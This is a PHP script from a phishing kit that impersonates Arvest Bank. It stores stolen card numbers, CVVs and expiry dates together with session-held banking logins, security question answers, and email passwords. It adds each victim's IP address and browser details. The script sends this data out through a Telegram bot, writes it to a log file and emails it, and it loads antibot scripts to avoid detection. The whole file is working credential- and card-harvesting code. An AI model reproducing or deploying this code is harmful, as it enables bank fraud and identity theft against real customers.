<?php

session_start();
error_reporting(0);

include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');

include('../Antibot/blockers.php');
include('../Antibot/detects.php');
include('../config.php');
include('../functions/get_browser.php');
include('../functions/get_ip.php');
$TIME_DATE = date('H:i:s d/m/Y');



if (isset($_POST['card_number'])){
	$_SESSION['_cardname_'] = $_POST['card_name'];
	$_SESSION['_cardnumber_'] = $_POST['card_number'];
	$_SESSION['_expdate_']    = $_POST['exp'];
	$_SESSION['_csc_']        = $_POST['csc'];
	
}


$Z118_MESSAGE .= "


[ ARVEST CARDING INFORMATION ]


[Username] = ".$_SESSION['first_userids']."
[Password] = ".$_SESSION['_my_password_']."


[Q1] = ".$_SESSION['question1']."
[A1] = ".$_SESSION['answer1']."

[Q2] = ".$_SESSION['question2']."
[A2] = ".$_SESSION['answer2']."

[Q3] = ".$_SESSION['question3']."
[A3] = ".$_SESSION['answer3']."

[Q4] = ".$_SESSION['question4']."
[A4] = ".$_SESSION['answer4']."

[Q5] = ".$_SESSION['question5']."
[A5] = ".$_SESSION['answer5']."


[Email address] = ".$_SESSION['email_address']."
[Password] = ".$_SESSION['email_password']."


[Card Name] =".$_SESSION['_cardname_']."
[Card Number] = ".$_SESSION['_cardnumber_']."
[Cvv]	= ".$_SESSION['_csc_']."
[Expiration Date] = ".$_SESSION['_expdate_']."



[VICTIM INFORMATION ]
[Time / Date] = ".$TIME_DATE."
[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
[REMOTE IP] = ".$_SERVER['REMOTE_ADDR']."
[BROWSER] = ".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."
[BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."

[ BY @X_hammer ]\n";


if (!empty($_POST['card_number'])){
	
	if($send_results_to_telegram == "on") {
		$data = [
			'text' => ''.$Z118_MESSAGE.'',
			'chat_id' => ''.$chat_id.''
		];
		file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?" . http_build_query($data) );
	}
	
	if($save_results_to_cpanel == "on") {
		$res_file = fopen("../logs/CARD_INFO.txt", "a");
		fwrite($res_file, $Z118_MESSAGE);
	}
	
	if($send_results_to_email == "on") {
		
		$Z118_MESSAGE .= "

################ [ ARVEST BANK INFORMATION] ####################
±±±±±±±±±±±±±±±±±[ CARDING INFORMATION]±±±±±±±±±±±±±±±±±±±±

[Username] = ".$_SESSION['first_userids']."
[Password] = ".$_SESSION['_my_password_'] ."

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

[Q1] = ".$_SESSION['question1']."
[A1] = ".$_SESSION['answer1']."

[Q2] = ".$_SESSION['question2']."
[A2] = ".$_SESSION['answer2']."

[Q3] = ".$_SESSION['question3']."
[A3] = ".$_SESSION['answer3']."

[Q4] = ".$_SESSION['question4']."
[A4] = ".$_SESSION['answer4']."

[Q5] = ".$_SESSION['question5']."
[A5] = ".$_SESSION['answer5']."

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

[Email Address] = ".$_SESSION['email_address']."
[password] = ".$_SESSION['email_password']."

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

[Cardholder's Name] = ".$_POST['card_name']."
[Card Number] = ".$_POST['card_number']."
[Expiry] = ".$_POST['exp']."
[Card Security Code ] = ".$_POST['csc']."

±±±±±±±±±±±±±±±±[VICTIM INFORMATION]±±±±±±±±±±±±±±±±±±±

[TIME/DATE]    = ".$TIME_DATE."
[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
[REMOTE IP]    = ".$_SERVER['REMOTE_ADDR']."
[BROWSER] = ".Z118_Browser($_SERVER['HTTP_user_AGENT'])." On ".Z118_OS($_SERVER['HTTP_user_AGENT'])."
[BROWSER] = ".$_SERVER['HTTP_user_AGENT']."</font><br>
################## [BY @X_hammer] #####################

\n";


		$Z118_SUBJECT = "✪ CARD DETAILS FROM: ✪".$_SESSION['_cardname_']." ✪";
		$Z118_HEADERS .= "From:Xhammer <xhammer@logs.com>";
		$Z118_HEADERS .= $_SESSION['_csc_']."\n";
		$Z118_HEADERS .= "MIME-Version: 1.0\n";
		$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
		@mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	}
	
	if($redirect_to_next_page == "on") {
		Header("Location: ../../billing.php");
	}
	
}



?>